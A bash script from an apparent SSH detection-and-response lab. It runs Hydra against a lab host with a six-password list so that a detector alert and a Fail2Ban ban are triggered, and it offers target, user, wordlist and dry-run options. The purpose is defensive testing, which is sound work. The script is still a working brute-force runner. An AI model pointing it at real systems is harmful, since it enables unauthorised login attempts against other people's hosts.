#!/usr/bin/env bash
# Phase 02 — SSH brute-force attack runner (run on Kali).
#
# Runs Hydra against the lab target with a fixed 6-password list. None of
# the passwords are expected to work; the point is to generate observable
# failures, not to break in. Six attempts is enough to trip both layers in
# one run: the Phase 04 detector alerts at 3, Fail2Ban bans at 5.
#
# Target and user come from (highest priority first):
#   1. --target / --user flags
#   2. lab.env at $LAB_ENV (default /etc/ssh-detection-response/lab.env)
#   3. built-in defaults: 10.10.10.20 / bader
#
# Usage:
#   ./run-attack.sh
#   ./run-attack.sh --target 10.10.10.20 --user bader
#   ./run-attack.sh --wordlist /path/to/list.txt
#   ./run-attack.sh --dry-run        # print the command, don't run it

set -euo pipefail

LAB_ENV="${LAB_ENV:-/etc/ssh-detection-response/lab.env}"
DRY_RUN=0
TARGET_OVERRIDE=""
USER_OVERRIDE=""
WORDLIST=""

usage() {
    awk 'NR > 1 && /^#/ { sub(/^# ?/, ""); print; next } NR > 1 { exit }' "$0"
    exit "${1:-0}"
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --dry-run)   DRY_RUN=1; shift ;;
        --target)    TARGET_OVERRIDE="${2:?--target needs a value}"; shift 2 ;;
        --user)      USER_OVERRIDE="${2:?--user needs a value}"; shift 2 ;;
        --wordlist)  WORDLIST="${2:?--wordlist needs a value}"; shift 2 ;;
        -h|--help)   usage 0 ;;
        *)           echo "Unknown arg: $1" >&2; usage 1 ;;
    esac
done

if [[ -r "$LAB_ENV" ]]; then
    # shellcheck disable=SC1090
    source "$LAB_ENV"
fi

TARGET="${TARGET_OVERRIDE:-${TARGET_IP:-10.10.10.20}}"
TARGET_USER="${USER_OVERRIDE:-${LAB_USER:-bader}}"

# Fresh demo wordlist each run, in a temp file (nothing left in the repo).
if [[ -z "$WORDLIST" ]]; then
    WORDLIST="$(mktemp --suffix=.pw.txt)"
    trap 'rm -f "$WORDLIST"' EXIT
    printf '%s\n' password 123456 letmein qwerty admin welcome1 > "$WORDLIST"
fi
[[ -r "$WORDLIST" ]] || { echo "ERROR: cannot read wordlist $WORDLIST" >&2; exit 2; }

CMD=(hydra -l "$TARGET_USER" -P "$WORDLIST" -t 4 -V "ssh://${TARGET}")

echo "==> Target:    ${TARGET}"
echo "==> User:      ${TARGET_USER}"
echo "==> Wordlist:  ${WORDLIST} ($(wc -l < "$WORDLIST") entries)"
echo "==> Command:   ${CMD[*]}"
echo

if [[ $DRY_RUN -eq 1 ]]; then
    echo "[dry-run] not executing"
    exit 0
fi

command -v hydra >/dev/null || { echo "ERROR: hydra not installed (sudo apt install hydra)." >&2; exit 2; }

if ! ping -c1 -W2 "$TARGET" >/dev/null 2>&1; then
    echo "ERROR: $TARGET is not reachable. Check the VM is up and on vmbr1." >&2
    exit 3
fi

# Not exec: the EXIT trap has to run afterwards to delete the temp wordlist.
# Hydra exits non-zero once Fail2Ban starts dropping its connections;
# that's the expected outcome of the demo, so don't fail on it.
"${CMD[@]}" || true
